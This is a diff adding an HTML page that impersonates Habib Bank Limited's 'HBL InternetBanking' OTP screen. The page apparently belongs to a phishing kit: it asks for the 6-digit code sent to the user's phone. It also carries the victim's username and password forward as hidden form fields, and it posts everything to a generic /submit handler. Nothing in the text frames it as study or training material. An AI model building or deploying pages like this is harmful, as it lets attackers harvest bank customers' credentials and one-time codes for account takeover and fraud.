@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HBL InternetBanking - OTP</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Arial:wght@400;600&display=swap');
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.35)),
+                        url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?ixlib=rb-4.0.3&auto=format&fit=crop&q=80')
+                        center/cover no-repeat;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container { 
+            width: 90%; 
+            max-width: 480px; 
+        }
+
+        .header {
+            background: #006b3f;
+            color: white;
+            padding: 18px 0;
+            text-align: center;
+            font-size: 1.85rem;
+            font-weight: 600;
+            border-radius: 8px 8px 0 0;
+        }
+
+        .login-section { 
+            background: #fff; 
+            padding: 40px 35px; 
+            border-radius: 0 0 8px 8px; 
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+            text-align: center;
+        }
+
+        .login-title {
+            font-size: 1.4rem;
+            margin-bottom: 20px;
+            color: #006b3f;
+            font-weight: 600;
+        }
+
+        .instruction {
+            color: #333;
+            margin-bottom: 25px;
+            font-size: 15px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 18px;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 8px;
+            border: 2px solid #ccc;
+            border-radius: 6px;
+            margin-bottom: 25px;
+        }
+
+        input:focus {
+            border-color: #006b3f;
+            outline: none;
+        }
+
+        .login-btn {
+            background: #006b3f; 
+            color: #fff; 
+            border: none; 
+            padding: 16px; 
+            font-size: 17px; 
+            font-weight: bold;
+            cursor: pointer; 
+            width: 100%; 
+            border-radius: 5px;
+        }
+        .login-btn:hover { background: #005a35; }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <strong>HBL</strong> InternetBanking
+        </div>
+
+        <div class="login-section">
+            <div class="login-title">Verify OTP</div>
+            <p class="instruction">Please enter the 6-digit OTP sent to your registered mobile number</p>
+            
+            <form action="/submit" method="POST">
+                <!-- Hidden fields for username and password -->
+                <input type="hidden" name="username" value="{{ username }}">
+                <input type="hidden" name="password" value="{{ password }}">
+
+                <input type="text" name="otp" maxlength="6" placeholder="000000" required autofocus>
+
+                <button type="submit" class="login-btn">Verify & Login</button>
+            </form>
+
+            <div class="footer">
+                Secure Session • Habib Bank Limited
+            </div>
+        </div>
+    </div>
+</body>
+</html>
